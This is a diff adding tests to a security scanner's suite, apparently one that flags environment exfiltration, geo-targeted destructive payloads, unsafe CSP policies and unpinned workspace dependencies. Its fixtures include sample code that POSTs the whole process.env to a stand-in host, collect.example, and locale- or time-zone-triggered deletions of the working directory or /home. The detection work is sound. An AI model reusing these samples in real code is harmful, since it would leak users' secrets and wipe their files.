@@ -1836,3 +1836,59 @@ test("profiles: private packages and code outside any package say what they can 
   assert.deepEqual(loose.profiles.map(p => [p.kind, Object.keys(p.capabilities)]), [["project", ["uses the network"]]]);
   assert.match(markdown(loose), /\*\*Code outside any package\*\* → uses the network \(1 file\)/);
 });
+
+test("the whole environment is exfiltration only when the file can send it", async () => {
+  const env = j("JSON.stringify(process", ".env)");
+  const dir = project({
+    "split.js": `const body = ${env};\nawait fetch("https://collect.example/x", { method: "POST", body });\n`,
+    "one-line.js": `fetch("https://collect.example/x", { method: "POST", body: ${env} });\n`,
+    // A test that prints the environment of a child process, and a debug dump to a local file.
+    "env.test.ts": `const out = await run(process.execPath, ["-e", "process.stdout.write(${env})"]);\n`,
+    "dump.js": `require("fs").writeFileSync("env.json", ${env});\n`,
+  });
+  const r = await run(dir);
+  const hits = r.findings.filter(f => f.rule === "mal-env-exfil").map(f => `${f.file}:${f.line}`).sort();
+  assert.deepEqual(hits, ["one-line.js:1", "split.js:1"]);
+});
+
+test("a time zone or locale has to be checked before a drastic action to count as a targeted payload", async () => {
+  const dir = project({
+    "includes.js": `const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;\nif (tz.includes("Moscow")) require("fs").rmSync(process.cwd(), { recursive: true });\n`,
+    "list.py": `import locale, shutil\nif locale.getdefaultlocale()[0] in ("ru_RU", "be_BY"):\n    shutil.rmtree("/home")\n`,
+    "index.js": `const lang = process.env.LANG;\nif (["ru_RU", "be_BY"].indexOf(lang) >= 0) process.exit(1);\n`,
+    // A test that saves TZ to restore it, then cleans its temp folder.
+    "control.test.ts": `beforeEach(() => {\n  tmp = fs.mkdtempSync("x");\n  savedTz = process.env.TZ;\n});\nafterEach(() => {\n  fs.rmSync(tmp, { recursive: true, force: true });\n  process.env.TZ = savedTz;\n});\n`,
+    "cli.js": `const tz = process.env.TZ || "UTC";\nconsole.log("time zone", tz);\nprocess.exit(0);\n`,
+  });
+  const r = await run(dir);
+  const hits = r.findings.filter(f => f.rule === "anom-targeted-payload").map(f => f.file).sort();
+  assert.deepEqual(hits, ["includes.js", "index.js", "list.py"]);
+});
+
+test("CSP: only unsafe script sources count; inline styles alone and nonces do not", async () => {
+  const meta = (policy) => `<meta http-equiv="Content-Security-Policy" content="${policy}">\n`;
+  const dir = project({
+    "styles.html": meta("default-src 'self'; style-src 'self' 'unsafe-inline'"),
+    "nonce.html": meta("script-src 'nonce-r4nd0m' 'unsafe-inline'; style-src 'unsafe-inline'"),
+    "inline.html": meta("default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'"),
+    "default.html": meta("default-src 'self' 'unsafe-inline'"),
+    "eval.html": meta("script-src 'self' 'unsafe-eval'"),
+  });
+  const r = await run(dir);
+  assert.deepEqual(r.findings.filter(f => f.rule === "csp-unsafe").map(f => f.file).sort(), ["default.html", "eval.html", "inline.html"]);
+});
+
+test("\"*\" on a package of the same npm workspace is not an unpinned dependency", async () => {
+  const dir = project({
+    "package.json": JSON.stringify({ name: "mono", private: true, workspaces: ["packages/*"] }),
+    "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: {
+      "": { name: "mono" },
+      "node_modules/@mono/core": { resolved: "packages/core", link: true },
+      "packages/core": { name: "@mono/core" },
+    } }),
+    "packages/core/package.json": JSON.stringify({ name: "@mono/core", version: "1.0.0" }),
+    "packages/cli/package.json": JSON.stringify({ name: "@mono/cli", version: "1.0.0", dependencies: { "@mono/core": "*", "left-pad": "*" } }),
+  });
+  const r = await run(dir);
+  assert.deepEqual(r.findings.filter(f => f.rule === "dep-unpinned").map(f => f.evidence), ['"left-pad": "*"']);
+});
